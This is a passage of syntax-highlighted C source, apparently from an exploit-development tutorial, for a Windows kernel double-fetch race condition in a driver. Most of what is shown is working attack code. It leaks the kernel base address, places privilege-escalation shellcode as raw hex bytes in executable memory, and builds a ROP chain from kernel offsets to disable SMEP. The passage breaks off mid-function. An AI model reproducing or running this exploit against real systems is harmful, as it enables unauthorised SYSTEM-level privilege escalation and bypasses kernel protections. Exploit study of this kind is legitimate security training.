<a id="__codelineno-35-78" name="__codelineno-35-78"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-79" name="__codelineno-35-79"></a>
<a id="__codelineno-35-80" name="__codelineno-35-80"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-81" name="__codelineno-35-81"></a>
<a id="__codelineno-35-82" name="__codelineno-35-82"></a><span class="w">    </span><span class="n">PIO_THREAD_PARAM</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-83" name="__codelineno-35-83"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-84" name="__codelineno-35-84"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-85" name="__codelineno-35-85"></a>
<a id="__codelineno-35-86" name="__codelineno-35-86"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-87" name="__codelineno-35-87"></a><span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-88" name="__codelineno-35-88"></a>
<a id="__codelineno-35-89" name="__codelineno-35-89"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Sending IOCTL on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-35-90" name="__codelineno-35-90"></a>
<a id="__codelineno-35-91" name="__codelineno-35-91"></a><span class="w">    </span><span class="cm">/* Get pointer to _IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-35-92" name="__codelineno-35-92"></a><span class="w">    </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="p">)</span><span class="n">IoThreadParam</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-93" name="__codelineno-35-93"></a>
<a id="__codelineno-35-94" name="__codelineno-35-94"></a><span class="w">    </span><span class="cm">/* Get DoubleFetch member from _IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-35-95" name="__codelineno-35-95"></a><span class="w">    </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-96" name="__codelineno-35-96"></a>
<a id="__codelineno-35-97" name="__codelineno-35-97"></a><span class="w">    </span><span class="cm">/* Get DriverHandle member from _IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-35-98" name="__codelineno-35-98"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-99" name="__codelineno-35-99"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-100" name="__codelineno-35-100"></a>
<a id="__codelineno-35-101" name="__codelineno-35-101"></a><span class="w">    </span><span class="cm">/* Run until we get control of RIP. */</span><span class="w"></span>
<a id="__codelineno-35-102" name="__codelineno-35-102"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-103" name="__codelineno-35-103"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-104" name="__codelineno-35-104"></a><span class="w">        </span><span class="n">EmptyWorkingSet</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-35-105" name="__codelineno-35-105"></a>
<a id="__codelineno-35-106" name="__codelineno-35-106"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-35-107" name="__codelineno-35-107"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-108" name="__codelineno-35-108"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to send IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-109" name="__codelineno-35-109"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-110" name="__codelineno-35-110"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-111" name="__codelineno-35-111"></a>
<a id="__codelineno-35-112" name="__codelineno-35-112"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-113" name="__codelineno-35-113"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-114" name="__codelineno-35-114"></a>
<a id="__codelineno-35-115" name="__codelineno-35-115"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">GetKernelBase</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-116" name="__codelineno-35-116"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-117" name="__codelineno-35-117"></a>
<a id="__codelineno-35-118" name="__codelineno-35-118"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-35-119" name="__codelineno-35-119"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">lpcbNeeded</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-120" name="__codelineno-35-120"></a>
<a id="__codelineno-35-121" name="__codelineno-35-121"></a><span class="w">    </span><span class="cm">/* Get base address of first driver (ntoskrnl.exe) */</span><span class="w"></span>
<a id="__codelineno-35-122" name="__codelineno-35-122"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Obtaining Driver Base Address!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-123" name="__codelineno-35-123"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-124" name="__codelineno-35-124"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBase</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-125" name="__codelineno-35-125"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-126" name="__codelineno-35-126"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error enumerating device drivers!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-127" name="__codelineno-35-127"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-128" name="__codelineno-35-128"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-129" name="__codelineno-35-129"></a>
<a id="__codelineno-35-130" name="__codelineno-35-130"></a><span class="w">    </span><span class="cm">/* Get name of first driver (ntoskrnl.exe) */</span><span class="w"></span>
<a id="__codelineno-35-131" name="__codelineno-35-131"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">BaseName</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-35-132" name="__codelineno-35-132"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBaseName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">BaseName</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-35-133" name="__codelineno-35-133"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBaseName</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-134" name="__codelineno-35-134"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-135" name="__codelineno-35-135"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error getting drivers base name!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-136" name="__codelineno-35-136"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-137" name="__codelineno-35-137"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-138" name="__codelineno-35-138"></a>
<a id="__codelineno-35-139" name="__codelineno-35-139"></a><span class="w">    </span><span class="cm">/*</span>
<a id="__codelineno-35-140" name="__codelineno-35-140"></a><span class="cm">     * ntoskrnl.exe is the first module in lpImageBase.</span>
<a id="__codelineno-35-141" name="__codelineno-35-141"></a><span class="cm">     * typecast LPVOID -&gt; unsigned long long</span>
<a id="__codelineno-35-142" name="__codelineno-35-142"></a><span class="cm">    */</span><span class="w"></span>
<a id="__codelineno-35-143" name="__codelineno-35-143"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">KernelBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
<a id="__codelineno-35-144" name="__codelineno-35-144"></a>
<a id="__codelineno-35-145" name="__codelineno-35-145"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Driver base name is: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-146" name="__codelineno-35-146"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] %s is located at: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-147" name="__codelineno-35-147"></a>
<a id="__codelineno-35-148" name="__codelineno-35-148"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-149" name="__codelineno-35-149"></a>
<a id="__codelineno-35-150" name="__codelineno-35-150"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-151" name="__codelineno-35-151"></a>
<a id="__codelineno-35-152" name="__codelineno-35-152"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">CreateShellcode</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-153" name="__codelineno-35-153"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-154" name="__codelineno-35-154"></a>
<a id="__codelineno-35-155" name="__codelineno-35-155"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x41\x50\x41\x51\x50\x65\x4C\x8B\x04\x25\x88\x01\x00\x00\x41\xC7\x80\xE4</span><span class="s">&quot;</span><span class="w"></span>
<a id="__codelineno-35-156" name="__codelineno-35-156"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x4D\x8B\x88\xB8\x00\x00\x00\x4C\x89\xC8\x49</span><span class="s">&quot;</span><span class="w"></span>
<a id="__codelineno-35-157" name="__codelineno-35-157"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x8B\x89\xE0\x02\x00\x00\x48\x83\xF9\x04\x74\x10\x4D\x8B\x89\xE8\x02\x00</span><span class="s">&quot;</span><span class="w"></span>
<a id="__codelineno-35-158" name="__codelineno-35-158"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x00\x49\x81\xE9\xE8\x02\x00\x00\xEB\xE3\x49\x8B\x89\x58\x03\x00\x00\x80</span><span class="s">&quot;</span><span class="w"></span>
<a id="__codelineno-35-159" name="__codelineno-35-159"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x59\x41\x59\x41\x58\x48\x31\xC0\x48</span><span class="s">&quot;</span><span class="w"></span>
<a id="__codelineno-35-160" name="__codelineno-35-160"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x31\xF6\x48\x83\xC4\x38\x4c\x89\xf3\xC3</span><span class="s">&quot;</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-161" name="__codelineno-35-161"></a>
<a id="__codelineno-35-162" name="__codelineno-35-162"></a>
<a id="__codelineno-35-163" name="__codelineno-35-163"></a><span class="w">    </span><span class="cm">/* Allocate shellcode in user mode */</span><span class="w"></span>
<a id="__codelineno-35-164" name="__codelineno-35-164"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-165" name="__codelineno-35-165"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">shellcode</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-166" name="__codelineno-35-166"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-167" name="__codelineno-35-167"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] FATAL: Unable to allocate shellcode!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-168" name="__codelineno-35-168"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-169" name="__codelineno-35-169"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-170" name="__codelineno-35-170"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Shellcode allocated at: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-171" name="__codelineno-35-171"></a>
<a id="__codelineno-35-172" name="__codelineno-35-172"></a><span class="w">    </span><span class="cm">/* Move allocated space in user mode */</span><span class="w"></span>
<a id="__codelineno-35-173" name="__codelineno-35-173"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">MoveMem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-35-174" name="__codelineno-35-174"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">MoveMem</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-175" name="__codelineno-35-175"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-176" name="__codelineno-35-176"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] FATAL: Unable to move shellcode into allocated memory!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-177" name="__codelineno-35-177"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-178" name="__codelineno-35-178"></a>
<a id="__codelineno-35-179" name="__codelineno-35-179"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ShellcodeBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-180" name="__codelineno-35-180"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ShellcodeBase</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-181" name="__codelineno-35-181"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-182" name="__codelineno-35-182"></a>
<a id="__codelineno-35-183" name="__codelineno-35-183"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-184" name="__codelineno-35-184"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-185" name="__codelineno-35-185"></a>
<a id="__codelineno-35-186" name="__codelineno-35-186"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-35-187" name="__codelineno-35-187"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">UserBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2096</span><span class="p">;</span><span class="w"> </span><span class="c1">// Offset for RIP control is at 2056.</span>
<a id="__codelineno-35-188" name="__codelineno-35-188"></a><span class="w">    </span><span class="n">BOOL</span><span class="w">    </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-189" name="__codelineno-35-189"></a>
<a id="__codelineno-35-190" name="__codelineno-35-190"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">ChangeSizeThreads</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-35-191" name="__codelineno-35-191"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">IoControlThreads</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-35-192" name="__codelineno-35-192"></a>
<a id="__codelineno-35-193" name="__codelineno-35-193"></a><span class="w">    </span><span class="n">PIO_THREAD_PARAM</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-194" name="__codelineno-35-194"></a>
<a id="__codelineno-35-195" name="__codelineno-35-195"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">ExploitThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">exploit</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-196" name="__codelineno-35-196"></a>
<a id="__codelineno-35-197" name="__codelineno-35-197"></a><span class="w">    </span><span class="cm">/* return number of processors */</span><span class="w"></span>
<a id="__codelineno-35-198" name="__codelineno-35-198"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">NumProcessors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CheckProcessors</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-35-199" name="__codelineno-35-199"></a>
<a id="__codelineno-35-200" name="__codelineno-35-200"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH struct */</span><span class="w"></span>
<a id="__codelineno-35-201" name="__codelineno-35-201"></a><span class="w">    </span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PAGE_NOCACHE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-202" name="__codelineno-35-202"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">PtrUserDoubleFetch</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-203" name="__codelineno-35-203"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-204" name="__codelineno-35-204"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-205" name="__codelineno-35-205"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-206" name="__codelineno-35-206"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-207" name="__codelineno-35-207"></a>
<a id="__codelineno-35-208" name="__codelineno-35-208"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH members */</span><span class="w"></span>
<a id="__codelineno-35-209" name="__codelineno-35-209"></a><span class="w">    </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-210" name="__codelineno-35-210"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-35-211" name="__codelineno-35-211"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-35-212" name="__codelineno-35-212"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate heap buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-213" name="__codelineno-35-213"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-214" name="__codelineno-35-214"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-35-215" name="__codelineno-35-215"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">[+] Allocated user buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-35-216" name="__codelineno-35-216"></a>
<a id="__codelineno-35-217" name="__codelineno-35-217"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-35-218" name="__codelineno-35-218"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-219" name="__codelineno-35-219"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-35-220" name="__codelineno-35-220"></a>
<a id="__codelineno-35-221" name="__codelineno-35-221"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetKernelBase</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-35-222" name="__codelineno-35-222"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ShellcodeAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateShellcode</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-35-223" name="__codelineno-35-223"></a>
<a id="__codelineno-35-224" name="__codelineno-35-224"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x4eaf14</span><span class="p">;</span><span class="w">       </span><span class="c1">// mov rax, rcx ; ret</span>
<a id="__codelineno-35-225" name="__codelineno-35-225"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x478bf9</span><span class="p">;</span><span class="w">       </span><span class="c1">// pop rcx ; ret</span>
<a id="__codelineno-35-226" name="__codelineno-35-226"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x70678</span><span class="p">;</span><span class="w">                      </span><span class="c1">// Disable SMEP</span>
